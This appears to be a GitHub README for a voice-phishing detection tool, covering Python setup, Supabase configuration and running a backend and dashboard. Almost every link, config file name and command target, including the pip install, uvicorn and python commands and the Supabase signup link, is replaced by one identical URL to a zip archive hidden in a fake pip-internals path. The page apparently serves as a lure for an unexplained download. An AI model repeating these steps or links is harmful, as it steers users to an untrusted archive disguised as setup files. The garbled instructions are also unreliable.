# 🛡️ Voice Phishing Detection System

A simple, real-time system to detect phishing in phone calls using speech-to-text and AI.  
You get a web dashboard, backend, and a client to record/upload audio.

---

## 🚀 Quick Start

### 1. **Clone the Project**

```sh
git clone <your-repo-url>
cd voice-phishing-detection
```

---

### 2. **Install Python Dependencies**

```sh
python -m venv venv
venv\Scripts\activate   # On Windows
# or
source venv/bin/activate   # On Linux/Mac

pip install -r https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip
```

---

### 3. **Supabase Setup**

#### a. **Create a Supabase Project**
- Go to [https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip](https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip) and create a new project.

#### b. **Get Your Supabase URL and API Key**
- In your Supabase project, go to **Project Settings → API**.
- Copy the **Project URL** and **anon public API key**.

#### c. **Create a Table**
- Go to **Table Editor** in Supabase.
- Click **New Table** and name it `chunks`.
- Add these columns:
    | Name           | Type      |
    |----------------|-----------|
    | id             | bigint    | (Primary key, auto-increment)
    | call_id        | text      |
    | chunk_number   | int4      |
    | chunk_name     | text      |
    | file_url       | text      |
    | transcript     | text      |
    | phishing_score | float8    |
    | created_at     | timestamp | (default: now())

#### d. **Create a Storage Bucket**
- Go to **Storage** in Supabase.
- Create a bucket named `audio-chunks`.

---

### 4. **Configure Your Keys**

- Open `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`.
- Find these lines at the top:
  ```python
  SUPABASE_URL = "Your-Supabase-URL"
  SUPABASE_KEY = "Your-Supabase-API-Key"
  ```
- Paste your Supabase URL and API key here.

---

### 5. **Download/Place the AI Model**

- Download or copy the `saved_model` folder (DistilBERT) into:  
  `classifier/saved_model/`
- If you use Whisper, make sure it downloads automatically or is available.

---

### 6. **Run the Backend**

```sh
uvicorn https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip --reload
```
- The API runs at [http://127.0.0.1:8000/](http://127.0.0.1:8000/)
- The dashboard is at [https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip](https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip)

---

### 7. **Run the Client (Recorder)**

- Edit `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip` if you need to set the backend URL.
- Run:
  ```sh
  python https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip
  ```

---

### 8. **Use the Dashboard**

- Open the dashboard in your browser.
- Click **Start Monitoring** to see real-time transcripts and phishing alerts.

---

## 🛠️ Troubleshooting

- **Keys not working?** Double-check your Supabase URL and API key.
- **No data in dashboard?** Make sure your Supabase table and bucket names match exactly.
- **Model errors?** Ensure `classifier/saved_model/` exists and is not empty.

---

## 📋 Summary

- **Supabase**: Used for storing audio metadata and files.
- **Keys**: Set in `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`.
- **Table**: Name it `chunks` with the columns above.
- **Bucket**: Name it `audio-chunks`.
- **Start backend**: `uvicorn https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip --reload`
- **Start client**: `python https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`
- **Dashboard**: Open `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip` in your browser.

---

**Need help?**  
Open an issue or ask in the project discussions!
